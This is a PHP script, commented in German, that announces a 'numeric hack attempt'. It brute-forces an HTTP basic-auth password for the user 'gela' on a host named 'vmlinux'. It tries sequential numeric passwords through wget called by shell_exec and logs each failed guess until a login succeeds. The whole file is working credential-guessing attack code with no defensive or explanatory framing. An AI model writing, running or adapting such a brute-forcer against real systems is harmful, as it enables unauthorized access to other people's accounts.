<?php
print "Starte nummerischen HAckversuch!\n";
$nr = 999;


while ($ja == 0) {

$name = "../hsfiles/nrlog.txt";

$fp = fopen($name,"a");

fwrite($fp,$log);

$testpw = $nr + 1;
$nr = $testpw;

$meinString = file_get_contents("../hsfiles/nr2.txt");
$findMich   = $testpw;
$pos = strpos($meinString, $findMich);

// Der !==-Operator kann ebenfalls verwendet werden. Die Verwendung von != von
// != würde in unserem Beispiel nicht wie erwartet arbeiten, da die Position
// von 'a' 0 ist. Das Statement (0 != false) evaluiert hierbei zu false.
if ($pos !== false) {

$used = 1;

}
else {

$used = 0;

}

print $used;




if($used == 0) {

print "\rTetse Passwort: \033[36m" . $testpw . "\033[39m";
$log = shell_exec("wget --http-user=gela --http-passwd=" . $testpw . " http://vmlinux/TraMonyGUI2/index.php");
print "\n\rDownlaoding...";

if(file_exists("index.php")) {

$ja = 1;

print "\r\033[31mPOSITIV!!! DAS PASSWORT IST\033[39m" . $testpw;

exit;
        }

else {
        print "\r\033[34mnegativ\033[39m";

        $daten = $testpw . ";";

// Festlegen des Dateinamens
$datei_name = "../hsfiles/nr2.txt";

/*
Die Datei wird zum schreiben geöffnet
und falls der Dateiname bereits vorhanden ist,
wird der komplette alte Inhalt vorher gelöscht!
*/
$fp = fopen($datei_name, "a");

/*
 Daten in Datei schreiben.
Dieser Befehl kann widerholt aufgerufen werden.
*/
fwrite($fp, $daten);

// Die Datei wird geschlossen.

}}}


?>
